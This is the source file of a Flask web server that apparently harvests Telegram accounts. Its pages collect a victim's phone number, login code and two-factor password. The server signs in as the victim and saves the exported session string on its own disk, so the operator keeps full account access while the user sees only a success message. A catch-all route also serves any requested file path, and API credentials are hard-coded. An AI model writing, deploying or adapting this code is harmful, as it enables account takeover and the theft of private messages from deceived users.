import os
import asyncio
import traceback
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid

app = Flask(__name__)
CORS(app)

API_ID = 33511945
API_HASH = "d044392a17690c14ee5b4a23651a0700"

# একটিভ ক্লায়েন্ট এবং হাশগুলো মেমোরিতে ধরে রাখার জন্য গ্লোবাল ডিকশনারি
active_clients = {}

@app.route('/', methods=['GET'])
def home():
    try:
        return send_file('index.html')
    except Exception:
        return "index.html not found", 404

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_file(path):
    if path == "verify":
        try:
            return send_file('verify.html')
        except Exception:
            return "verify.html not found", 404
    try:
        return send_file(path)
    except Exception:
        return "File not found", 404

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"
        
        async def main():
            # ইন-মেমোরি ক্লায়েন্ট তৈরি করে কানেক্ট করা
            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent_code = await client.send_code(phone)
            
            # ক্লায়েন্টটি গ্লোবাল ডিকশনারিতে সেভ করে রাখা হচ্ছে যাতে ভেরিফাই করার সময় ডিসকানেক্ট না হয়
            active_clients[phone] = {
                "client": client,
                "phone_code_hash": sent_code.phone_code_hash
            }
            return sent_code.phone_code_hash

        phone_code_hash = asyncio.run(main())
        
        return jsonify({
            "status": "success", 
            "message": "OTP code sent to Telegram!",
            "phone_code_hash": phone_code_hash
        })
    except Exception as e:
        print("SEND CODE ERROR:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired or please request code again."}), 400

    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]

    try:
        async def verify_main():
            try:
                await client.sign_in(phone, phone_code_hash, code)
            except SessionPasswordNeeded:
                if not password:
                    return {"status": "2fa_required"}
                
                await client.check_password(password)
            
            session_string = await client.export_session_string()
            
            os.makedirs("sessions", exist_ok=True)
            session_filename = f"sessions/{phone.replace('+', '')}.session"
            with open(session_filename, "w", encoding="utf-8") as f:
                f.write(session_string)
                
            await client.disconnect()
            return {"status": "success"}

        res = asyncio.run(verify_main())
        
        if res and res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required", "message": "2FA Password required"})
            
        if phone in active_clients:
            del active_clients[phone]
            
        return jsonify({"status": "success", "message": "Session generated successfully!"})
        
    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except PhoneCodeExpired:
        return jsonify({"status": "error", "message": "OTP code has expired!"}), 400
    except PasswordHashInvalid:
        return jsonify({"status": "error", "message": "Incorrect 2FA Password!"}), 400
    except Exception as e:
        print("VERIFY ERROR DETAILS:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
